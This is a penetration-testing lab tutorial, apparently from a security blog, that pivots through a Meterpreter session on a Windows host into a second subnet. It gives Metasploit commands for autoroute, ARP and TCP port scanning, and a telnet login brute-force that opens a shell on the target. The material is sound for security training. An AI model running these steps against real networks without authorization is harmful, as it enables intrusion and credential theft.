# Telnet Pivoting through Meterpreter

**Pivoting** is a technique to get inside an unreachable network with help of pivot \(center point\). In simple words, it is an attack through which an attacker can exploit that system which belongs to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.

**Lab Setup requirement:**

**Attacker machine**: Kali Linux

Pivot Machine \(client\): window operating system with **two** network interface

Target Machine: Ubuntu server \(Allow telnet service\)

![](https://i0.wp.com/4.bp.blogspot.com/-RcHdOnEepeI/WdesfMRaUoI/AAAAAAAAR0U/-ZaPGuJq27Ie_eKS32U8C0Y-gFy5rA-5wCLcBGAs/s1600/0.1.png?w=687&ssl=1)

**Exploit pivot machine**

Use exploit MS17-010 or multi handler to hack the pivot machine.sessions

| 1 | sessions |
| :--- | :--- |


From the given image, you can confirm that I owned a pivot machine \(192.168.1.107\) meterpreter session1.

![](https://i0.wp.com/3.bp.blogspot.com/-A5EUdF6XjK4/WdesfBYDvUI/AAAAAAAAR0c/qenx083v0KY5P_79QrwUF6jERN-fa75kQCLcBGAs/s1600/0.png?w=687&ssl=1)

Check the network interface through the following command:meterpreter&gt; ifconfig

| 1 | meterpreter&gt; ifconfig |
| :--- | :--- |


From the given image you can observe two networks interface in pivot’s system **1st** for IP **192.168.1.107** through which the attacker is connected and **2nd** for IP **10.0.0.20** through which telnet server \(targets\) are connected.

![](https://i2.wp.com/2.bp.blogspot.com/-1IVP__t0NkA/WdesfZPSRNI/AAAAAAAAR0Y/rQ6UeTd2cyYvBaCqZARiInN0iY15C6KJQCLcBGAs/s1600/1.png?w=687&ssl=1)

#### **Route Add**

Since the attacker belongs to **the 192.168.1.1** interface and target belongs to **10.0.0.0** interface, therefore, it is not possible to directly make an attack on the target network until unless the attacker acquires the same network connection. In order to achieve a 10.0.0.0 network attacker need to run the **post exploitation** “autoroute”.use post/multi/manage/autoroute   
msf post\(autoroute\) &gt; set session 1  
msf post\(autoroute\) &gt; exploit

| 123 | use post/multi/manage/autoroutemsf post\(autoroute\) &gt; set session 1msf post\(autoroute\) &gt; exploit |
| :--- | :--- |


![](https://i2.wp.com/2.bp.blogspot.com/-dRA7jEPDQw4/WdesgE-4upI/AAAAAAAAR0g/HWnxzHVY2egbFg8NRUJZrCr59RlFtY9RACLcBGAs/s1600/2.png?w=687&ssl=1)

This Module will perform an ARP scan for a given IP range through a Meterpreter Session.use post/windows/gather/arp\_scanner  
msf post\(arp\_scanner\) &gt; set rhosts 10.0.0.1-30  
msf post\(arp\_scanner\) &gt; set session 1  
msf post\(arp\_scanner\) &gt; set thread 20  
msf post\(arp\_scanner\) &gt; exploit

| 12345 | use post/windows/gather/arp\_scannermsf post\(arp\_scanner\) &gt; set rhosts 10.0.0.1-30msf post\(arp\_scanner\) &gt; set session 1msf post\(arp\_scanner\) &gt; set thread 20msf post\(arp\_scanner\) &gt; exploit |
| :--- | :--- |


 ****Here we found a new IP **10.0.0.10** as shown in the given image. Let’s perform TCP port scan for activated services on this machine.

![](https://i2.wp.com/2.bp.blogspot.com/-OiKcGREAsPU/WdesgXTFncI/AAAAAAAAR0k/EhoDoR8fUSc0rKLachW4Lv9uHhPSGGL9ACLcBGAs/s1600/3.png?w=687&ssl=1)

This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.use auxiliary/scanner/portscan/tcp  
msf auxiliary\(tcp\) &gt; set ports 23  
msf auxiliary\(tcp\) &gt; set rhosts 10.0.0.10  
msf auxiliary\(tcp\) &gt; set thread 10  
msf auxiliary\(tcp\) &gt;exploit

| 12345 | use auxiliary/scanner/portscan/tcpmsf auxiliary\(tcp\) &gt; set ports 23msf auxiliary\(tcp\) &gt; set rhosts 10.0.0.10msf auxiliary\(tcp\) &gt; set thread 10msf auxiliary\(tcp\) &gt;exploit |
| :--- | :--- |


From given you can observe **port 23** is **open** and we know that port 23 is used for telnet service.

![](https://i2.wp.com/3.bp.blogspot.com/-hnTmNoLpvjM/WdesgZYTIBI/AAAAAAAAR0o/Zge7r40gJDgh7RaXJhloIZ0jm-gvFGAOgCLcBGAs/s1600/4.png?w=687&ssl=1)

#### **Use Telnet login Brute Force Attack**

An attacker always tries to make a brute force attack for stealing credential for unauthorized access.

This module will test a telnet login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.

Now type the following command to Brute force TELNET login:use auxiliary/scanner/telnet/telnet\_login  
msf auxiliary\(telnet\_login\) &gt; set rhosts 10.0.0.10  
msf auxiliary\(telnet\_login\) &gt; set user\_file /root/Desktop/user  
msf auxiliary\(telnet\_login\) &gt; set pass\_file /root/Desktop/pass  
msf auxiliary\(telnet\_login\) &gt; exploit

| 12345 | use auxiliary/scanner/telnet/telnet\_loginmsf auxiliary\(telnet\_login\) &gt; set rhosts 10.0.0.10msf auxiliary\(telnet\_login\) &gt; set user\_file /root/Desktop/usermsf auxiliary\(telnet\_login\) &gt; set pass\_file /root/Desktop/passmsf auxiliary\(telnet\_login\) &gt; exploit |
| :--- | :--- |


From given image you can observe that TELNET server is not secure against brute force attack because it is showing a matching combination of **username: aarti** and **password: 123** for login simultaneously it has opened victims command shell as **session 2**

![](https://i0.wp.com/1.bp.blogspot.com/-ZyNhQN94264/WdeshdevjqI/AAAAAAAAR0s/F2z26xiQluYnYHBuRIYMJmXsNrW9OTUMwCLcBGAs/s1600/5.1.png?w=687&ssl=1)

Let’s count the number of victim sessions we have hold using the following command:sessions

| 1 | sessions |
| :--- | :--- |


From the given image you can observe there are two sessions **1st** as the meterpreter session of windows system and **2nd** as command shell of the telnet server.

![](https://i1.wp.com/2.bp.blogspot.com/-qQbctZxMfAM/Wdeshf3d8AI/AAAAAAAAR0w/_zMU2zLy4yoHTcZDbb4DJcrq4W65IfjkQCLcBGAs/s1600/5.2.png?w=687&ssl=1)sessions 2

| 1 | sessions 2 |
| :--- | :--- |


Now attacker is command shell of the server, let’s verify through network configuration.ifconfig

| 1 | ifconfig |
| :--- | :--- |


From given, you can observe the network IP is **10.0.0.10**

![](https://i0.wp.com/3.bp.blogspot.com/-sRXTs4XCNcE/WdeshXFVuoI/AAAAAAAAR00/5b5poTQfT-471HBys3qpxc9d5XFtqNmUgCLcBGAs/s1600/5.3.png?w=687&ssl=1)

\*\*\*\*

